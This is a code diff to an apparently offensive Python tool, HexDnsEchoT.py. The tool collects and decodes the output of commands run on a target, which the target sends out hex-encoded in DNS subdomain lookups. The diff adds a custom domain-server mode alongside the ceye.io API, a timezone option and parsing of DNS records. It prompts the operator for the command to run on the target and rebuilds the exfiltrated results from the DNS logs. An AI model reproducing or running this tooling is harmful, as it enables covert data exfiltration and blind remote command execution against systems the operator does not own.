@@ -27,8 +27,26 @@ def get_new_config():
     lastRecordLen = 0
     finishOnce = False
 
+def get_ds_config():
+    global time_zone,domain_server,count_counts,domain,dnsurl,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
+    url = domain_server + '/new_gen'
+    dataResult = json.loads(requests.get(url,verify=False).text)
+    domain = dataResult['domain']
+    dnsurl = domain
+    token = dataResult['token']
+    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
+    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone=time_zone) # record last finish time
+    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server + " -t " + token + " -lt \"" + lastFinishTime + "\" -m GR" + " -cc " + str(count_counts) + "\n")
+    print(domain_server + '/' +token)
+    # dig.pm's timezone is utc，need to change timezone
+    print(lastFinishTime)
+    commandStartPos = 0
+    commandEndPos = 0
+    lastRecordLen = 0
+    finishOnce = False
+
 def get_config():
-    global dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
+    global time_zone,domain_server,count_counts,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
     print(lastFinishTime)
     commandStartPos = 0
     commandEndPos = 0
@@ -94,6 +112,21 @@ def get_dnslogdata() -> list:
         commandHex[commandName].extend(tempList)
         return commandHex[commandName]
 
+# get DNSLog data 
+def get_ds_dnslogdata() -> list:
+    if commandStartPos and commandEndFlag: 
+        commandHex[commandName].extend([result[length-1][1]['subdomain'] 
+                                        for length in range(len(result),commandStartPos,-1) 
+                                        if result[length-1][1]['subdomain'].count('.') == count_counts])
+                                        # Get the command part of the DNSLog data
+        tempList = []
+        for length in range(commandStartPos,-1,-1):
+            if result[length-1][1]['time'] < lastFinishTime:break
+            if result[length-1][1]['subdomain'].count('.') == count_counts:
+                tempList.append(result[length-1][1]['subdomain']) 
+        commandHex[commandName].extend(tempList)
+        return commandHex[commandName]
+
 # deal with DNSlog data, Format the output
 def deal_data(data: list):
     global finishOnce
@@ -133,72 +166,154 @@ def deal_data(data: list):
         print('----Get Result End!----')
         finishOnce = True
 
+# deal with DNSlog data, Format the output
+def deal_ds_data(data: list):
+    global finishOnce
+    if commandStartPos and commandEndFlag:
+        for length in range(commandStartPos,-1,-1):
+            if result[length-1][1]['time'] < lastFinishTime:break
+            if result[length-1][1]['subdomain'].count('.') == count_counts:
+                commandHex[commandName].append(result[length-1][1]['subdomain'])
+        try:
+            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] } 
+            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
+
+            hexCommand = [ item[1][:32] for item in hexCommand]
+        except:
+            print('!!!!Error Command format! Try to find DNSLog site(dnslog) to get conntent..')
+            pass
+        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
+        commandResult = ''.join(hexCommand)
+        # print(commandResult)
+        try:
+            commandResult = commandResult.split("0a3131")
+            commandResult = commandResult[0] #兼容linux命令
+        except:
+            pass
+        print('\n----Command Result----')
+        Head = '\033[36m'
+        End = '\033[0m'
+        try:
+            try:#gb2312解码
+                print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
+            except UnicodeDecodeError:#utf-8解码 linux存在中文字符需要这个解码
+                print(Head + binascii.a2b_hex(commandResult).decode('utf-8') + End)
+        except:
+            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
+        print('----Get Result End!----')
+        finishOnce = True
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-d', "--dnsurl", help = "ceye dnslog")
     parser.add_argument('-t', "--token", help = "ceye token")
     parser.add_argument('-lt', "--lastfinishtime", help = "the lastfinisgtime")
     parser.add_argument('-f', "--filter", help = "dns filter")
+    parser.add_argument('-ds', "--domain_server", help = "domain server")
+    parser.add_argument('-tz', "--timezone", help = "timezone")
+    parser.add_argument('-cc', "--count", help = "count counts")
     parser.add_argument('-m', "--model", help = "recent result", default = "result")
     args = parser.parse_args()
-    if args.model == "GR":
-        if args.dnsurl == None:
-            print("without ceyedns!")
-            sys.exit(0)
-        if args.token == None:
-            print("without ceyetoken!")
-            sys.exit(0)
-        if args.lastfinishtime == None:
-            print("without lastfinishtime!")
-            sys.exit(0)
-        lastFinishTime = args.lastfinishtime
-        get_config()
-        domain = args.dnsurl
-        filterdns = args.filter
-        dnsurl =args.filter + "." + args.dnsurl
-        print(dnsurl)
-        token = args.token
-        print(token)
-    else:
-        if args.dnsurl == None:
-            print("without ceyedns!")
-            sys.exit(0)
-        if args.token == None:
-            print("without ceyetoken!")
-            sys.exit(0)
-        filterdns = generate_code(8)
-        domain = args.dnsurl
-        dnsurl = filterdns + "." +args.dnsurl
-        print(dnsurl)
-        token = args.token
-        print(token)
-        command = input("请输入想要执行的命令:")
-        get_new_config()
-        generate_command()
-        
-
-    while True:
-        if finishOnce:   
-            get_new_config()
+    if args.domain_server == None:
+        if args.model == "GR":
+            if args.dnsurl == None:
+                print("without ceyedns!")
+                sys.exit(0)
+            if args.token == None:
+                print("without ceyetoken!")
+                sys.exit(0)
+            if args.lastfinishtime == None:
+                print("without lastfinishtime!")
+                sys.exit(0)
+            lastFinishTime = args.lastfinishtime
+            get_config()
+            domain = args.dnsurl
+            filterdns = args.filter
+            dnsurl =args.filter + "." + args.dnsurl
+            print(dnsurl)
+            token = args.token
+            print(token)
+        else:
+            if args.dnsurl == None:
+                print("without ceyedns!")
+                sys.exit(0)
+            if args.token == None:
+                print("without ceyetoken!")
+                sys.exit(0)
             filterdns = generate_code(8)
+            domain = args.dnsurl
             dnsurl = filterdns + "." +args.dnsurl
             print(dnsurl)
             token = args.token
             print(token)
             command = input("请输入想要执行的命令:")
+            get_new_config()
             generate_command()
+    else:
+        if args.model == "GR":
+            if args.token == None:
+                print("without token!")
+                sys.exit(0)
+            if args.lastfinishtime == None:
+                print("without lastfinishtime!")
+                sys.exit(0)
+            if args.count == None:
+                print("without count")
+                sys.exit(0)
+            count_counts = args.count
+            count_counts = int(count_counts)
+            lastFinishTime = args.lastfinishtime
+            token = args.token
+            domain_server = args.domain_server
+            get_config()
+        else:
+            if args.timezone == None:
+                print("without timezone")
+                sys.exit(0)
+            if args.count == None:
+                print("without count")
+                sys.exit(0)
+            command = input("请输入想要执行的命令:")
+            domain_server = args.domain_server
+            count_counts = args.count
+            count_counts = int(count_counts)
+            time_zone = args.timezone
+            get_ds_config()
+            generate_command()
+
+    while True:
+        if finishOnce:
+            if args.domain_server == None:
+                get_new_config()
+                filterdns = generate_code(8)
+                dnsurl = filterdns + "." +args.dnsurl
+                print(dnsurl)
+                token = args.token
+                print(token)
+                command = input("请输入想要执行的命令:")
+                generate_command()
+            else:
+                command = input("请输入想要执行的命令：")
+                get_ds_config()
+                generate_command()
 
         for i in range(requestTime,-1,-1):
             print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='') 
             time.sleep(1)
         try:
-            url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + filterdns
+            if args.domain_server == None:
+                url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + filterdns
+            else:
+                url = domain_server + '/' +token
             #proxies = { 'http':'http://127.0.0.1:8080' }
-            result = json.loads(requests.get(url, proxies=False).text)
-            result = result['data']
-            if result == []:
-                result = NULL
-            result = sorted(result, key=lambda x: int(x['id']))
+            result = json.loads(requests.get(url, proxies=False, verify=False).text)
+            if args.domain_server == None:
+                result = result['data']
+                if result == []:
+                    result = NULL
+                result = sorted(result, key=lambda x: int(x['id']))
+            else:
+                result = sorted(result.items(), key=lambda x: int(x[0]))
         except:
             print('\r', 'Not Find DNSLog Result!', end='')
             continue
@@ -208,23 +323,45 @@ if __name__ == "__main__":
         commandEndFlag = 1 if commandEndPos == len(result) else 0 
         commandEndPos = len(result)
         
-        if not commandStartPos and ((result[-1]['name'].count('.'))  == 5 or 
-                                    commandStartFlag): 
-                                    # judge if the DNSLog recording is start
-            if result[-1]['created_at'] < lastFinishTime: 
-                print('\r', 'Not Find DNSLog Result!', end='')
-                continue                     
-            commandStartPos = len(result)
-            commandName = result[-1]['name'].split('.')[1]
-            print('\nFind Command Record!...')
-            print('----Command: \033[36m{}\033[0m----'.format(commandName))
-            commandHex[commandName] = [] 
-            print('Wait Command DNSLog Record Finish...')   
-        if commandStartPos and ((result[-1]['name'].count('.')) != 5 or 
-                                commandEndFlag):
-                                # judge if the DNSLog recording is over
-            commandEndFlag = 1
-            #print('Command DNSLog Record Finish...')   
+        if args.domain_server == None:
+            if not commandStartPos and ((result[-1]['name'].count('.'))  == 5 or 
+                                        commandStartFlag): 
+                                        # judge if the DNSLog recording is start
+                if result[-1]['created_at'] < lastFinishTime: 
+                    print('\r', 'Not Find DNSLog Result!', end='')
+                    continue                     
+                commandStartPos = len(result)
+                commandName = result[-1]['name'].split('.')[1]
+                print('\nFind Command Record!...')
+                print('----Command: \033[36m{}\033[0m----'.format(commandName))
+                commandHex[commandName] = [] 
+                print('Wait Command DNSLog Record Finish...')   
+            if commandStartPos and ((result[-1]['name'].count('.')) != 5 or 
+                                    commandEndFlag):
+                                    # judge if the DNSLog recording is over
+                commandEndFlag = 1
+                #print('Command DNSLog Record Finish...')   
 
-        dataList = get_dnslogdata()
-        deal_data(dataList)
+            dataList = get_dnslogdata()
+            deal_data(dataList)
+        else:
+            if not commandStartPos and ((result[-1][1]['subdomain'].count('.'))  == count_counts or 
+                                        commandStartFlag): 
+                                        # judge if the DNSLog recording is start
+                if result[-1][1]['time'] < lastFinishTime: 
+                    print('\r', 'Not Find DNSLog Result!', end='')
+                    continue                     
+                commandStartPos = len(result)
+                commandName = result[-1][1]['subdomain'].split('.')[1]
+                print('\nFind Command Record!...')
+                print('----Command: \033[36m{}\033[0m----'.format(commandName))
+                commandHex[commandName] = [] 
+                print('Wait Command DNSLog Record Finish...')   
+            if commandStartPos and ((result[-1][1]['subdomain'].count('.')) != count_counts or 
+                                    commandEndFlag):
+                                    # judge if the DNSLog recording is over
+                commandEndFlag = 1
+                #print('Command DNSLog Record Finish...')   
+
+            dataList = get_ds_dnslogdata()
+            deal_ds_data(dataList)
